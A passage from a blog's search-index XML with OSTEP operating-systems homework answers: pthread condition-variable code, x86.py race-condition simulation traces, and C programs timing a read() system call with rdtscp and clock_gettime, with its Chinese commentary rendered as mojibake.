class="literal">NULL</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);<span class="comment">//é˜²æ­¢flag = true;æ‰§è¡Œæ¯”while (flag == false)æ—©</span></span><br><span class="line">    assert(pthread_mutex_lock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    flag = <span class="literal">true</span>;<span class="comment">//æ“ä½œflagä¸´ç•Œé‡åŠ ä¸ªé”</span></span><br><span class="line">    pthread_cond_signal(&amp;cond);</span><br><span class="line">    assert(pthread_mutex_unlock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    flag = <span class="literal">false</span>;</span><br><span class="line">    assert(pthread_mutex_lock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    flag = <span class="literal">true</span>;<span class="comment">//æ“ä½œflagä¸´ç•Œé‡åŠ ä¸ªé”</span></span><br><span class="line">    pthread_cond_signal(&amp;cond);</span><br><span class="line">    assert(pthread_mutex_unlock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    pthread_join(pid, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_mutex_destroy(&amp;lock);</span><br><span class="line">    pthread_cond_destroy(&amp;cond);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;end&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:26 Concurrency:An Introduction Homework</title>
      <link href="/2023/04/15/OSTEP-homework-26-Concurrency-An-Introduction/"/>
      <url>/2023/04/15/OSTEP-homework-26-Concurrency-An-Introduction/</url>
      
        <content type="html"><![CDATA[<ul><li>ä¸´ç•ŒåŒºï¼ˆcritical sectionï¼‰æ˜¯è®¿é—®å…±äº«èµ„æºçš„ä¸€æ®µä»£ç ï¼Œèµ„æºé€šå¸¸æ˜¯ä¸€ä¸ªå˜é‡æˆ–æ•°æ®ç»“æ„</li><li>ç«æ€æ¡ä»¶ï¼ˆrace conditionï¼‰å‡ºç°åœ¨å¤šä¸ªæ‰§è¡Œçº¿ç¨‹å¤§è‡´åŒæ—¶è¿›å…¥ä¸´ç•ŒåŒºæ—¶ï¼Œå®ƒä»¬éƒ½è¯•å›¾æ›´æ–°å…±äº«çš„æ•°æ®ç»“æ„</li></ul><ol start="3"><li></li></ol><p>æ²¡æœ‰å…±äº«å˜é‡ï¼Œå“ªæ¥çš„ç«æ€æ¡ä»¶</p><ol start="6"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/threads-intro&gt; cat looping-race-nolock.s</span><br><span class="line"><span class="meta"># assumes %bx has loop count in it</span></span><br><span class="line"></span><br><span class="line">.main</span><br><span class="line">.top</span><br><span class="line"><span class="meta"># critical section</span></span><br><span class="line">mov <span class="number">2000</span>, %ax  <span class="meta"># get <span class="string">&#x27;value&#x27;</span> at address 2000</span></span><br><span class="line">add $<span class="number">1</span>, %ax    <span class="meta"># increment it</span></span><br><span class="line">mov %ax, <span class="number">2000</span>  <span class="meta"># store it back</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># see <span class="keyword">if</span> we<span class="string">&#x27;re still looping</span></span></span><br><span class="line"><span class="string"><span class="meta">sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">halt</span></span></span><br><span class="line"><span class="string"><span class="meta">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p looping-race-nolock.s -t 2 -M 2000  -i 4 -r -s 0 -c</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG seed 0</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG numthreads 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG program looping-race-nolock.s</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt frequency 4</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt randomness True</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG argv</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG load address 1000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memsize 128</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memtrace 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG regtrace</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG cctrace False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG printstats False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG verbose False</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta"> 2000          Thread 0                Thread 1</span></span></span><br><span class="line"><span class="string"><span class="meta">    0</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ----- Halt;Switch -----  ----- Halt;Switch -----</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p looping-race-nolock.s -t 2 -M 2000  -i 4 -r -s 1 -c</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG seed 1</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG numthreads 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG program looping-race-nolock.s</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt frequency 4</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt randomness True</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG argv</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG load address 1000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memsize 128</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memtrace 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG regtrace</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG cctrace False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG printstats False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG verbose False</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta"> 2000          Thread 0                Thread 1</span></span></span><br><span class="line"><span class="string"><span class="meta">    0</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    0                            1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0                            1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ----- Halt;Switch -----  ----- Halt;Switch -----</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p looping-race-nolock.s -t 2 -M 2000  -i 4 -r -s 2 -c</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG seed 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG numthreads 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG program looping-race-nolock.s</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt frequency 4</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt randomness True</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG argv</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG load address 1000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memsize 128</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memtrace 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG regtrace</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG cctrace False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG printstats False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG verbose False</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta"> 2000          Thread 0                Thread 1</span></span></span><br><span class="line"><span class="string"><span class="meta">    0</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ----- Halt;Switch -----  ----- Halt;Switch -----</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1006 halt</span></span></span><br></pre></td></tr></table></figure><p>ä¸åœ¨ä¸´ç•ŒåŒºä¹‹é—´å‘ç”Ÿä¸­æ–­å°±å¯ä»¥çš„åˆ°æ­£ç¡®ç»“æœ</p><ol start="7"><li></li></ol><p>å¯æƒ³è€ŒçŸ¥ï¼Œåªæœ‰-i 3åŠæ›´å¤§å¯ä»¥é¿å¼€ç«æ€åŒº</p><ol start="8"><li></li></ol><p>å›´ç»•ç€ä¸åœ¨ä¸´ç•ŒåŒºå‘ç”Ÿä¸­æ–­æ¥</p><p>-i å¤§äº597(æ‰§è¡Œ100æ¬¡å…±600æ¡æŒ‡ä»¤ï¼Œåé¢ä¸‰æ¡å’Œç«æ€æ²¡å…³ç³»)æˆ–è€…æ˜¯3çš„å€æ•°å°±å¯ä»¥</p><ol start="9"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/threads-intro&gt; cat wait-<span class="keyword">for</span>-me.s</span><br><span class="line">.main</span><br><span class="line">test $<span class="number">1</span>, %ax     <span class="meta"># ax should be 1 (signaller) or 0 (waiter)</span></span><br><span class="line">je .signaller</span><br><span class="line"></span><br><span class="line">.waiter</span><br><span class="line">mov  <span class="number">2000</span>, %cx</span><br><span class="line">test $<span class="number">1</span>, %cx</span><br><span class="line">jne .waiter</span><br><span class="line">halt</span><br><span class="line"></span><br><span class="line">.signaller</span><br><span class="line">mov  $<span class="number">1</span>, <span class="number">2000</span></span><br><span class="line">halt</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p wait-<span class="keyword">for</span>-me.s -a ax=<span class="number">1</span>,ax=<span class="number">0</span> -R ax,cx -M <span class="number">2000</span> -c</span><br><span class="line">ARG seed <span class="number">0</span></span><br><span class="line">ARG numthreads <span class="number">2</span></span><br><span class="line">ARG program wait-<span class="keyword">for</span>-me.s</span><br><span class="line">ARG interrupt frequency <span class="number">50</span></span><br><span class="line">ARG interrupt randomness False</span><br><span class="line">ARG argv ax=<span class="number">1</span>,ax=<span class="number">0</span></span><br><span class="line">ARG load address <span class="number">1000</span></span><br><span class="line">ARG memsize <span class="number">128</span></span><br><span class="line">ARG memtrace <span class="number">2000</span></span><br><span class="line">ARG regtrace ax,cx</span><br><span class="line">ARG cctrace False</span><br><span class="line">ARG printstats False</span><br><span class="line">ARG verbose False</span><br><span class="line"></span><br><span class="line"> <span class="number">2000</span>      ax    cx          Thread <span class="number">0</span>                Thread <span class="number">1</span></span><br><span class="line">    <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span></span><br><span class="line">    <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1000</span> test $<span class="number">1</span>, %ax</span><br><span class="line">    <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1001</span> je .signaller</span><br><span class="line">    <span class="number">1</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1006</span> mov  $<span class="number">1</span>, <span class="number">2000</span></span><br><span class="line">    <span class="number">1</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1007</span> halt</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">0</span>   ----- Halt;Switch -----  ----- Halt;Switch -----</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">0</span>                            <span class="number">1000</span> test $<span class="number">1</span>, %ax</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">0</span>                            <span class="number">1001</span> je .signaller</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1002</span> mov  <span class="number">2000</span>, %cx</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1003</span> test $<span class="number">1</span>, %cx</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1004</span> jne .waiter</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1005</span> halt</span><br></pre></td></tr></table></figure><ol start="10"><li></li></ol><p>ç›¸å½“äºäº¤æ¢çº¿ç¨‹ï¼Œåœ¨çº¿ç¨‹0ç­‰å¾…åˆ°ä¸­æ–­åçº¿ç¨‹1æŠŠeaxè®¾ä¸º1ï¼Œä¹‹å‰éƒ½åœ¨åšæ— ç”¨å¾ªç¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>       <span class="number">0</span>     <span class="number">0</span>   <span class="number">1002</span> mov  <span class="number">2000</span>, %cx</span><br><span class="line"> <span class="number">0</span>       <span class="number">0</span>     <span class="number">0</span>   <span class="number">1003</span> test $<span class="number">1</span>, %cx</span><br><span class="line"> <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>   ------ Interrupt ------  ------ Interrupt ------</span><br><span class="line"> <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>                            <span class="number">1000</span> test $<span class="number">1</span>, %ax</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:6 Mechanism:Limited Direct Execution Homework</title>
      <link href="/2023/04/15/OSTEP-homework-6-Mechanism-Limited-Direct-Execution/"/>
      <url>/2023/04/15/OSTEP-homework-6-Mechanism-Limited-Direct-Execution/</url>
      
        <content type="html"><![CDATA[<ol><li></li></ol><p>ä¹¦é‡Œè¯´çš„rdtsc(TSCæ˜¯ä¸€ä¸ª64ä½çš„å¯„å­˜å™¨è®°å½•å¤„ç†å™¨ä»å¯åŠ¨åˆ°ç°åœ¨çš„æ—¶é’Ÿå‘¨æœŸæ•°)æŠŠé«˜32ä½æ”¾å…¥edxï¼Œä½32ä½æ”¾å…¥raxï¼Œåœ¨å¤šæ ¸å¤„ç†å™¨å¥½åƒå·²ç»ä¸å¤ªå‡†ç¡®ï¼Œ</p><ul><li>CPUä¹±åºæ‰§è¡Œä¹‹åï¼Œæ— æ³•ä¿è¯ rdtsc æŒ‡ä»¤çš„æ‰§è¡Œä¸€å®šæ˜¯åœ¨ä¸šåŠ¡ä»£ç æ‰§è¡Œçš„ä¹‹å‰å’Œä¹‹å</li><li>å¤„ç†å™¨çš„å˜é¢‘</li><li>æ— æ³•ä¿è¯æ¯ä¸ªCPUæ ¸å¿ƒçš„ TSC å¯„å­˜å™¨æ˜¯åŒæ­¥çš„</li></ul><p>å¼•å…¥äº†å¸¸é‡é€Ÿç‡TSCçš„ç‰¹æ€§è§£å†³äº†å˜é¢‘é—®é¢˜<code> cat /proc/cpuinfo | grep constant_tsc</code>æŸ¥çœ‹å¤„ç†å™¨æ˜¯å¦æ”¯æŒï¼Œä½†æ˜¯ä¸èƒ½ä¼°è®¡æ—¶é—´</p><p>å¯¹äºä¹±åºé—®é¢˜æˆ‘ä»¬å¯ä»¥åŠ cpuçº§çš„memory barrier<code>mfence</code></p><p>æˆ–è€…ç”¨rdtscp,ä»–å…·æœ‰åºåˆ—åŒ–ç‰¹æ€§ï¼Œå³å®ƒä¼šåœ¨æŒ‡ä»¤æ‰§è¡Œå‰ç­‰å¾…ä¹‹å‰çš„æ‰€æœ‰æŒ‡ä»¤éƒ½æ‰§è¡Œå®Œæ¯•ï¼Œå¹¶ä¸”åœ¨æŒ‡ä»¤æ‰§è¡Œåä¿è¯æ²¡æœ‰åç»­æŒ‡ä»¤ä¼šåœ¨å®ƒä¹‹å‰æ‰§è¡Œ<code>cat /proc/cpuinfo | grep rdtscp</code>æŸ¥çœ‹æ˜¯å¦æ”¯æŒ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> period = <span class="number">0</span>, period2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> low = <span class="number">0</span>, hight = <span class="number">0</span>,low2 = <span class="number">0</span>, hight2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./test.c&quot;</span>, O_RDWR);</span><br><span class="line">    assert(<span class="number">-1</span> != fd);</span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;rdtscp&quot;</span>:<span class="string">&quot;=a&quot;</span>(low), <span class="string">&quot;=d&quot;</span>(hight))</span>;</span><br><span class="line">    period = hight &lt;&lt; <span class="number">32</span> | low;</span><br><span class="line">    <span class="comment">// __asm__ __volatile__ (&quot;mfence&quot; : : : &quot;memory&quot;);//å¦‚æœè¦ä½¿ç”¨rdtscéœ€è¦åŠ barrieræ¥é˜²æ­¢ä¹±åº</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        read(fd, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// __asm__ __volatile__ (&quot;mfence&quot; : : : &quot;memory&quot;);</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;rdtscp&quot;</span>:<span class="string">&quot;=a&quot;</span>(low), <span class="string">&quot;=d&quot;</span>(hight))</span>;</span><br><span class="line">    period2 = hight &lt;&lt; <span class="number">32</span> | low;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lu\n&quot;</span>, period/<span class="number">1000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lu\n&quot;</span>, period2/<span class="number">1000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lu\n&quot;</span>, (period2 - period)/<span class="number">1000000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;-----------&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/<span class="number">6</span>&gt; <span class="keyword">while</span> <span class="literal">true</span> ;taskset -c <span class="number">1</span> sudo ./test;end</span><br><span class="line"><span class="number">35475179</span></span><br><span class="line"><span class="number">35475567</span></span><br><span class="line"><span class="number">387</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35475595</span></span><br><span class="line"><span class="number">35475995</span></span><br><span class="line"><span class="number">399</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35476026</span></span><br><span class="line"><span class="number">35476421</span></span><br><span class="line"><span class="number">395</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35476449</span></span><br><span class="line"><span class="number">35476848</span></span><br><span class="line"><span class="number">399</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35476881</span></span><br><span class="line"><span class="number">35477275</span></span><br><span class="line"><span class="number">393</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35477304</span></span><br><span class="line"><span class="number">35477695</span></span><br><span class="line"><span class="number">390</span></span><br><span class="line">-----------</span><br><span class="line">^Câ </span><br></pre></td></tr></table></figure><p>å¦‚æœæƒ³è¦ä¸€ä¸ªå‡†ç¡®æ—¶é—´å¯ä»¥ç”¨clock_gettimeï¼Œä¼šæ¯”gettimeofdayå‡†ä¸€ç‚¹,gettimeofdayå’Œclock_gettimeå‡½æ•°è¿”å›çš„æ˜¯å½“å‰ç³»ç»Ÿæ—¶é’Ÿçš„æ—¶é—´å€¼ï¼Œè€Œä¸æ˜¯æŒ‡ä»¤çš„æ‰§è¡Œæ—¶é—´ï¼Œæ‰€ä»¥æ²¡ç”¨barrieræ¥é˜²æ­¢ä¹±åº</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./test.c&quot;</span>, O_RDWR);</span><br><span class="line">    assert(<span class="number">-1</span> != fd);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">start_time</span>, <span class="title">end_time</span>;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    struct timespec &#123;</span></span><br><span class="line"><span class="comment">    time_t tv_sec;  // ç§’</span></span><br><span class="line"><span class="comment">    long tv_nsec;   // çº³ç§’</span></span><br><span class="line"><span class="comment">    &#125;;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    clock_gettime(CLOCK_MONOTONIC, &amp;start_time);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        read(fd, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    clock_gettime(CLOCK_MONOTONIC, &amp;end_time);</span><br><span class="line">    <span class="type">double</span> elapsed_time = (end_time.tv_sec * <span class="number">1e9</span> + end_time.tv_nsec - start_time.tv_sec * <span class="number">1e9</span> - start_time.tv_nsec)/<span class="number">1000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ns:%f\n&quot;</span>, elapsed_time);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;us:%f\n&quot;</span>, elapsed_time / <span class="number">1000.0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ms:%f\n&quot;</span>, elapsed_time / <span class="number">1e6</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/6 [SIGINT]&gt; gcc -g -o  test test.c</span><br><span class="line">grxer@grxer ~/D/s/O/o/6&gt; while true ;taskset -c 1 sudo ./test;end</span><br><span class="line">ns:127.141074</span><br><span class="line">us:0.127141</span><br><span class="line">ms:0.000127</span><br><span class="line">ns:127.567767</span><br><span class="line">us:0.127568</span><br><span class="line">ms:0.000128</span><br><span class="line">ns:126.079839</span><br><span class="line">us:0.126080</span><br><span class="line">ms:0.000126</span><br><span class="line">ns:127.143936</span><br><span class="line">us:0.127144</span><br><span class="line">ms:0.000127</span><br><span class="line">ns:126.850415</span><br><span class="line">us:0.126850</span><br><span class="line">ms:0.000127</span><br><span class="line">ns:121.985531</span><br><span class="line">us:0.121986</span><br><span class="line">ms:0.000122</span><br><span class="line">ns:119.445469</span><br><span class="line">us:0.119445</span><br><span class="line">ms:0.000119</span><br><span class="line">ns:119.942527</span><br><span class="line">us:0.119943</span><br><span class="line">ms:0.000120</span><br><span class="line">^Câ   </span><br></pre></td></tr></table></figure><p>ä¸¤ç§æ–¹å¼æ¯”è¾ƒä¸€ä¸‹ï¼Œçœ‹äº†ä¸‹cpuä¸»é¢‘<code>cpu MHz         : 3193.924</code> é‚£ä¹ˆä¸€æ¡æŒ‡ä»¤å‘¨æœŸ1 &#x2F; 3193.924MHz &#x3D; 0.312975 nsï¼Œ0.312975*395&#x3D;123.625125ns</p><p>ä¸¤ç§æ–¹å¼ç›¸å·®æ— å‡ </p><ol 